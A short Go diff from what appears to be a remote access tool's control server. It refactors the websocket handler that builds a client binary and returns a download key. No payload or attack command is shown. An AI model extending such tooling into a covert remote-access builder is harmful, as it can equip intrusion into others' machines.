@@ -1,19 +1,16 @@
 package main
 
 import (
-	"encoding/json"
 	"rat/command/build"
 
 	"golang.org/x/net/websocket"
 )
 
-type BuildMessage Message
+type BuildMessage build.Config
 
-func (d BuildMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
-	var config build.Config
-	json.Unmarshal([]byte(data), &config)
-
-	path, name, err := build.Build(&config)
+func (m BuildMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
+	cast := build.Config(m)
+	path, name, err := build.Build(&cast)
 
 	if err != nil {
 		return err
@@ -24,8 +21,7 @@ func (d BuildMessage) Handle(ws *websocket.Conn, client *Client, data string) er
 		Name: name,
 	})
 
-	event := newEvent(DownloadQueryEvent, 0, string(tempKey))
-	err = websocket.JSON.Send(ws, &event)
-
-	return err
+	return sendMessage(ws, client, DownloadQueryMessage{
+		Key: tempKey,
+	})
 }
